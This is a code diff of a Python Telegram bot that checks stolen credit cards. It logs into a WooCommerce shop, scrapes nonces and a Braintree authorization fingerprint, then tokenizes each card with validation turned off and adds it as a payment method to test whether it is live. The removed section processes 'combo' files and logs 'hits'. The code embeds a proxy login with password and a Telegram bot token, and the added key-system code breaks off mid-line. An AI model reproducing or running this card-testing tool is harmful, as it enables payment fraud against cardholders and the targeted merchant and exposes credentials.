@@ -7,7 +7,7 @@ from hh import keep_alive
 
 init(autoreset=True)
 
-# ===================== YOUR PROXY =====================
+# ===================== PROXY =====================
 proxies_list = ["http://naveed:Qwerty_123ABC@196.244.48.124:12345"]
 
 def get_proxy():
@@ -26,7 +26,6 @@ def Tele(cx):
 
         headers = {'User-Agent': ua}
 
-        # Login
         r.get("https://www.woolroots.com/my-account/", headers=headers, timeout=20)
         login_page = r.get("https://www.woolroots.com/my-account/", headers=headers, timeout=20)
         login_nonce = re.search(r'name="woocommerce-login-nonce" value="(.+?)"', login_page.text).group(1)
@@ -36,7 +35,6 @@ def Tele(cx):
             'woocommerce-login-nonce': login_nonce, '_wp_http_referer': '/my-account/', 'login': 'Log in'
         }, headers=headers, timeout=20)
 
-        # Get Token
         add_page = r.get("https://www.woolroots.com/my-account/add-payment-method/", headers=headers, timeout=20)
         client_nonce = re.search(r'"client_token_nonce":"(.+?)"', add_page.text).group(1)
 
@@ -48,7 +46,6 @@ def Tele(cx):
         decoded = base64.b64decode(bt_data).decode('utf-8')
         auth = re.search(r'"authorizationFingerprint":"(.+?)"', decoded).group(1)
 
-        # Tokenize
         json_data = {
             "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token }}",
             "variables": {"input": {"creditCard": {"number": cc,"expirationMonth": mes,"expirationYear": ano,"cvv": cvv},"options": {"validate": False}}},
@@ -62,7 +59,6 @@ def Tele(cx):
 
         nonce = tokenize.json()['data']['tokenizeCreditCard']['token']
 
-        # Add Payment
         final_page = r.get("https://www.woolroots.com/my-account/add-payment-method/", headers=headers, timeout=20)
         add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.+?)"', final_page.text).group(1)
 
@@ -83,69 +79,11 @@ def Tele(cx):
     except Exception as e:
         return f"Error: {str(e)[:80]}"
 
-# ===================== BOT WITH YOUR TOKEN =====================
+# ===================== BOT =====================
 sto = {"stop": False}
 bot = telebot.TeleBot("7700737624:AAEKOb2kJFTN6g-Cod4vDphfpqlJSsjzoHU", parse_mode="HTML")
-owner_id = 5579729798   # Change this if you want another owner
+OWNER_ID = 7077294261
 
-@bot.message_handler(commands=["stop"])
-def stopit(message):
-    sto["stop"] = True
-    bot.reply_to(message, "✅ Bot Stopped")
-
-@bot.message_handler(commands=["start"])
-def welcome(message):
-    bot.send_message(message.chat.id, "𓆩 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𓆪\nSend Combo Txt File")
-
-@bot.message_handler(content_types=["document"])
-def check(message):
-    if message.chat.id != owner_id:
-        return bot.reply_to(message, "❌ Not Premium User")
-
-    sto["stop"] = False
-    name = message.from_user.first_name or "User"
-    
-    file_info = bot.get_file(message.document.file_id)
-    downloaded = bot.download_file(file_info.file_path)
-    with open("combo.txt", "wb") as f:
-        f.write(downloaded)
-
-    with open("combo.txt") as f:
-        cards = [line.strip() for line in f if line.strip()]
-
-    ok = 0
-    ko = bot.reply_to(message, f"🔥 Starting Check...\nUser: {name}\nTotal Cards: {len(cards)}").message_id
-
-    for cc in cards:
-        if sto["stop"]: 
-            break
-        result = Tele(cc)
-        
-        if "Approved" in result or "New Card Added" in result:
-            ok += 1
-            respo = f'''
-✅ <b>APPROVED</b>
-━━━━━━━━━━━━━━
-[↯] 𝗖𝗖: <code>{cc}</code>
-[↯] 𝗥𝗲𝘀𝘂𝗹𝘁: {result}
-[↯] 𝗣𝗿𝗼𝘅𝘆: Live
-━━━━━━━━━━━━━━
-            '''
-            bot.reply_to(message, respo)
-            with open("hit.txt", "a", encoding="utf-8") as f:
-                f.write(respo + "\n\n")
-        else:
-            print(Fore.RED + f"Declined: {cc} → {result}")
-
-        try:
-            bot.edit_message_text(f"Progress: {ok} Hits / {len(cards)} Checked", message.chat.id, ko)
-        except:
-            pass
-
-        time.sleep(0.8)
-
-    bot.reply_to(message, f"✅ Checking Finished!\nHits: {ok}")
-
-keep_alive()
-print("✅ Bot Started Successfully | New Token Active")
-bot.infinity_polling()
+# Key System
+redeemed_users = set()
+valid_keys = {"B3
